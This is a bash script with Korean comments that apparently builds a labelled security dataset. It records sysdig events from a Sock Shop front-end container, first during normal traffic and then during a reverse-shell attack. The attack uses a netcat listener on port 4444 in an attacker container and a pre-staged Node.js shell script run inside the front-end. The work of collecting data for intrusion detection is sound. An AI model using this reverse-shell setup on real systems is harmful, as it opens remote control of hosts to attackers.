#!/bin/bash

OUTPUT_DIR="/home/marine/attack_data"
FRONTEND="docker-compose_front-end_1"
FRONTEND_ID="1c56edcca776"

echo "==============================="
echo "Sock Shop 방법1 — front-end 리버스 쉘"
echo "==============================="

# 1단계: sysdig 수집 시작 (front-end 컨테이너 ID 필터)
echo "[$(date +%T)] sysdig 수집 시작"
echo "COLLECTION_START: $(date +%s%N)" > $OUTPUT_DIR/timeline_sockshop_m1.txt
echo "FRONTEND_ID: $FRONTEND_ID" >> $OUTPUT_DIR/timeline_sockshop_m1.txt
rm -f $OUTPUT_DIR/sockshop_m1_raw.json
sudo bash -c "nohup sysdig -j 'container.id=$FRONTEND_ID' >> $OUTPUT_DIR/sockshop_m1_raw.json 2>/dev/null &"
sleep 2

# 2단계: 정상 구간 60초 (user-sim 자동 트래픽)
echo "[$(date +%T)] 정상 구간 시작 (60초)"
echo "NORMAL_START: $(date +%s%N)" >> $OUTPUT_DIR/timeline_sockshop_m1.txt
sleep 60

# 3단계: attacker 준비
echo "[$(date +%T)] attacker 리버스 쉘 대기"
docker exec attacker pkill nc 2>/dev/null
docker exec -d attacker bash -c "nc -lvp 4444 > /tmp/sockshop_m1_shell.txt 2>&1"
sleep 2

# 4단계: 공격 시작
echo "[$(date +%T)] 공격 시작 (front-end Node.js 리버스 쉘)"
echo "ATTACK_START: $(date +%s%N)" >> $OUTPUT_DIR/timeline_sockshop_m1.txt
docker exec $FRONTEND sh -c "node /dev/shm/shell.js &"

# 5단계: 공격 구간 120초
echo "[$(date +%T)] 공격 구간 유지 (120초)"
sleep 120

# 6단계: 수집 종료
echo "[$(date +%T)] 수집 종료"
echo "ATTACK_END: $(date +%s%N)" >> $OUTPUT_DIR/timeline_sockshop_m1.txt

sudo pkill sysdig 2>/dev/null
docker exec attacker pkill nc 2>/dev/null

echo "==============================="
echo "완료! 결과 확인:"
ls -lh $OUTPUT_DIR/sockshop_m1_raw.json
echo "이벤트 수: $(wc -l < $OUTPUT_DIR/sockshop_m1_raw.json)"
cat $OUTPUT_DIR/timeline_sockshop_m1.txt
echo "==============================="
